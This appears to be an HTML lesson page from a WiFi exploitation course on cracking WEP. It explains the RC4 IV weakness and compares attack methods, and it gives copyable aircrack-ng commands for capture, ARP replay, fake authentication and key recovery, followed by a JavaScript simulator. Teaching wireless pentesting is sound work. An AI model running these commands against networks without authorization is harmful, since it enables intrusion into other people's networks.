@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 05 — WEP Cracking | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt { color:var(--accent2); user-select:none; }
+    .cmd { color:#e6edf3; }
+    .flag { color:#ffa657; }
+    .str { color:#a5d6ff; }
+    .cmt { color:#6e7681; font-style:italic; }
+    .out { color:var(--text-dim); }
+    .out-ok { color:var(--accent2); }
+    .out-warn { color:var(--warn); }
+    .out-err { color:var(--accent3); }
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
+    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
+    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Attack method cards */
+    .attack-methods { display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:16px; margin:20px 0; }
+    .attack-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; }
+    .attack-card.best { border-color:var(--accent2); box-shadow:0 0 0 1px var(--accent2); }
+    .attack-card h4 { font-size:14px; color:var(--text-head); margin-bottom:10px; display:flex; align-items:center; gap:8px; }
+    .attack-card .badge { font-size:10px; padding:2px 8px; border-radius:10px; background:var(--accent); color:#0d1117; font-weight:bold; }
+    .attack-card .badge.best { background:var(--accent2); }
+    .attack-card .speed { font-size:12px; color:var(--text-dim); margin-bottom:10px; }
+    .attack-card .req { font-size:12px; color:var(--text-dim); }
+
+    /* RC4 visualization */
+    .rc4-viz { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .rc4-viz h4 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .rc4-flow { display:flex; flex-wrap:wrap; align-items:center; gap:12px; justify-content:center; }
+    .rc4-step { background:var(--bg); border:1px solid var(--border); border-radius:var(--radius); padding:12px 16px; text-align:center; }
+    .rc4-step .label { font-size:10px; color:var(--text-dim); text-transform:uppercase; letter-spacing:1px; }
+    .rc4-step .value { font-size:12px; font-family:var(--font-mono); color:var(--accent2); margin-top:6px; }
+    .rc4-arrow { color:var(--text-dim); font-size:20px; }
+
+    /* Crack simulator */
+    .crack-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .crack-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-controls { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
+    .sim-control { display:flex; flex-direction:column; gap:6px; }
+    .sim-control label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-control select, .sim-control input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; }
+    .sim-control select:focus, .sim-control input:focus { border-color:var(--accent); }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:120px; white-space:pre-wrap; }
+    .sim-progress { height:8px; background:var(--border); border-radius:4px; margin-top:12px; overflow:hidden; }
+    .sim-progress-bar { height:100%; background:var(--accent2); width:0%; transition:width 0.3s; }
+
+    /* Nav footer */
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.next { background:var(--accent); color:#0d1117; }
+    .nav-btn.next:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="#" class="active"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 05</div>
+      <div class="module-badge">&#9679; Tier 3 &mdash; Legacy</div>
+      <h1>WEP Cracking</h1>
+      <p class="subtitle">Exploit the fundamental weaknesses of WEP encryption — from passive IV collection to active ARP replay attacks. Learn why WEP can be cracked in minutes with the right techniques.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Intermediate</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~45 min</div>
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Adapter required</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> WEP cracking techniques must only be used on networks you own or have explicit written authorization to test. WEP is obsolete and should never be used in production environments.</p>
+    </div>
+
+    <!-- Section 1: Why WEP -->
+    <section id="why">
+      <h2><span class="section-num">01</span> Why WEP Still Matters</h2>
+      <p>While obsolete, WEP remains relevant because:</p>
+      
+      <div class="callout info">
+        <span class="ci">&#128269;</span>
+        <div>
+          <strong>Legacy systems:</strong> Older hardware, IoT devices, and some SCADA equipment cannot be upgraded.<br>
+          <strong>Misconfiguration:</strong> Some administrators still deploy WEP.<br>
+          <strong>Penetration tests:</strong> You'll encounter it in real engagements.<br>
+          <strong>Speed:</strong> WEP can be cracked in minutes — making it a quick win for attackers.
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 2: RC4 Visualization -->
+    <section id="rc4">
+      <h2><span class="section-num">02</span> How WEP Encryption Works</h2>
+      <p>WEP uses the RC4 stream cipher with a critical flaw: a tiny Initialization Vector (IV).</p>
+
+      <div class="rc4-viz">
+        <h4>&#128274; WEP Encryption Process</h4>
+        <div class="rc4-flow">
+          <div class="rc4-step">
+            <div class="label">24-bit IV</div>
+            <div class="value">0x1A2B3C</div>
+          </div>
+          <div class="rc4-arrow">+</div>
+          <div class="rc4-step">
+            <div class="label">Secret Key</div>
+            <div class="value">abcde12345...</div>
+          </div>
+          <div class="rc4-arrow">&#8594;</div>
+          <div class="rc4-step">
+            <div class="label">RC4 Key</div>
+            <div class="value">IV + Secret</div>
+          </div>
+          <div class="rc4-arrow">&#8594;</div>
+          <div class="rc4-step">
+            <div class="label">Keystream</div>
+            <div class="value">0x8F3A2B...</div>
+          </div>
+          <div class="rc4-arrow">+</div>
+          <div class="rc4-step">
+            <div class="label">Plaintext</div>
+            <div class="value">"Hello..."</div>
+          </div>
+          <div class="rc4-arrow">XOR</div>
+          <div class="rc4-step">
+            <div class="label">Ciphertext</div>
+            <div class="value">0x3C9F1A...</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>The flaw:</strong> Only 16.7 million possible IVs (24 bits). With enough traffic, IVs repeat — allowing statistical attacks to recover the keystream and eventually the secret key.</div>
+      </div>
+    </section>
+
+    <!-- Section 3: Attack Methods -->
+    <section id="methods">
+      <h2><span class="section-num">03</span> WEP Attack Methods</h2>
+      <p>Choose the method based on network conditions and available clients.</p>
+
+      <div class="attack-methods">
+        <div class="attack-card best">
+          <h4>ARP Replay <span class="badge best">FASTEST</span></h4>
+          <div class="speed">Speed: Minutes</div>
+          <div class="req">Requires: Active client generating ARP</div>
+          <p style="margin-top:10px;font-size:12px;color:var(--text-dim);">Wait for ARP packet, replay it repeatedly. Each replay generates new IVs. Most reliable method.</p>
+        </div>
+        
+        <div class="attack-card">
+          <h4>Fragmentation</h4>
+          <div class="speed">Speed: Minutes</div>
+          <div class="req">Requires: Authentication to AP</div>
+          <p style="margin-top:10px;font-size:12px;color:var(--text-dim);">Extracts keystream from AP. Faster than Chop-Chop but requires fake auth.</p>
+        </div>
+
+        <div class="attack-card">
+          <h4>Chop-Chop</h4>
+          <div class="speed">Speed: 10-30 min</div>
+          <div class="req">Requires: Data traffic</div>
+          <p style="margin-top:10px;font-size:12px;color:var(--text-dim);">Decrypts packets byte-by-byte by manipulating CRC-32. Works when ARP not available.</p>
+        </div>
+
+        <div class="attack-card">
+          <h4>Cafe Latte</h4>
+          <div class="speed">Speed: 15-30 min</div>
+          <div class="req">Requires: Client on network</div>
+          <p style="margin-top:10px;font-size:12px;color:var(--text-dim);">Attack from client side. Capture client ARP, modify it, get responses with new IVs.</p>
+        </div>
+
+        <div class="attack-card">
+          <h4>Passive Capture</h4>
+          <div class="speed">Speed: Hours</div>
+          <div class="req">Requires: Monitor mode only</div>
+          <p style="margin-top:10px;font-size:12px;color:var(--text-dim);">Simply collect IVs over time. Slow but completely passive.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 4: Commands -->
+    <section id="commands">
+      <h2><span class="section-num">04</span> Execution Commands</h2>
+      <p>Step-by-step commands for the most reliable WEP cracking technique: ARP Replay.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Step 1: Monitor mode & capture</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-step1')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-step1"><span class="cmt"># Enable monitor mode</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0</span>
+
+<span class="cmt"># Target specific WEP network and capture</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> <span class="str">wep_capture</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Step 2: ARP Replay attack (new terminal)</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-step2')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-step2"><span class="cmt"># Start ARP replay - fastest method</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--arpreplay</span> <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>
+
+<span class="cmt"># If no clients connected, use fake auth first:</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--fakeauth</span> <span class="str">0</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-h</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Step 3: Crack the key</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-step3')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-step3"><span class="cmt"># PTW attack (faster, requires ARP packets)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aircrack-ng <span class="flag">-z</span> <span class="str">wep_capture-01.cap</span></span>
+
+<span class="cmt"># Or default (KoreK) attack</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aircrack-ng <span class="str">wep_capture-01.cap</span></span>
+
+<span class="out">Opening wep_capture-01.cap</span>
+<span class="out">Read 2847 packets.</span>
+<span class="out">#  BSSID              ESSID     Encryption</span>
+<span class="out-ok">1  AA:BB:CC:DD:EE:FF  MyAP     WEP (2404 IVs)</span>
+<span class="out">...</span>
+<span class="out-ok">KEY FOUND! [ 31:32:33:34:35:36 ]</span></div>
+      </div>
+    </section>
+
+    <!-- Section 5: Simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">05</span> WEP Crack Simulator</h2>
+      <p>Configure an attack scenario and see simulated progress.</p>
+
+      <div class="crack-sim">
+        <h3>&#128301; WEP Crack Simulation</h3>
+        <div class="sim-controls">
+          <div class="sim-control">
+            <label>Attack Method</label>
+            <select id="simMethod">
+              <option value="arp">ARP Replay (recommended)</option>
+              <option value="fragment">Fragmentation</option>
+              <option value="chop">Chop-Chop</option>
+              <option value="passive">Passive Capture</option>
+            </select>
+          </div>
+          <div class="sim-control">
+            <label>Has Connected Client</label>
+            <select id="simClient">
+              <option value="yes">Yes - active client</option>
+              <option value="no">No - need fake auth</option>
+            </select>
+          </div>
+          <button class="sim-btn" onclick="runCrackSim()">Start Cracking</button>
+        </div>
+        <div class="sim-output" id="simOutput"><span style="color:var(--text-dim);">Configure options above and click "Start Cracking"...</span></div>
+        <div class="sim-progress"><div class="sim-progress-bar" id="simProgress"></div></div>
+      </div>
+    </section>
+
+    <!-- Nav -->
+    <div class="nav-footer">
+      <a href="../module-04-packet-analysis/" class="nav-btn prev">&#8592; Module 04: Packet Analysis</a>
+      <a href="../module-06-wpa2-handshake/" class="nav-btn next">Module 06: WPA2 Handshake &#8594;</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  // Copy terminal
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    const text = el.innerText || el.textContent;
+    navigator.clipboard.writeText(text.trim()).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  // Crack simulation
+  function runCrackSim() {
+    const method = document.getElementById('simMethod').value;
+    const hasClient = document.getElementById('simClient').value;
+    const output = document.getElementById('simOutput');
+    const progress = document.getElementById('simProgress');
+
+    output.innerHTML = '<span style="color:var(--text-dim)">Initializing attack...</span>';
+    progress.style.width = '0%';
+
+    setTimeout(() => {
+      let lines = [];
+      
+      if (method === 'arp') {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> Using ARP Replay attack');
+        lines.push('<span style="color:var(--text-dim)">Waiting for ARP packet...</span>');
+      } else if (method === 'fragment') {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> Using Fragmentation attack');
+        if (hasClient === 'no') {
+          lines.push('<span style="color:var(--warn)">[!]</span> Need authentication - running fakeauth...');
+          lines.push('<span style="color:var(--accent2)">[✓]</span> Authentication successful');
+        }
+      } else if (method === 'chop') {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> Using Chop-Chop attack');
+      } else {
+        lines.push('<span style="color:var(--accent2)">[✓]</span> Passive capture mode');
+      }
+
+      output.innerHTML = lines.join('\n');
+      
+      // Progress animation
+      let pct = 0;
+      const interval = setInterval(() => {
+        pct += Math.random() * 15 + 5;
+        if (pct >= 100) {
+          pct = 100;
+          clearInterval(interval);
+          output.innerHTML += '\n\n<span style="color:var(--accent2)">KEY FOUND! [ 31:32:33:34:35:36 ]</span>';
+        }
+        progress.style.width = pct + '%';
+        
+        if (pct < 30) {
+          output.innerHTML += '\n<span style="color:var(--text-dim)">Collecting IVs: ' + Math.floor(pct * 200) + '...</span>';
+        } else if (pct < 70) {
+          output.innerHTML += '\n<span style="color:var(--accent2)">Running PTW attack...</span>';
+        }
+      }, 500);
+    }, 500);
+  }
+</script>
+</body>
+</html>
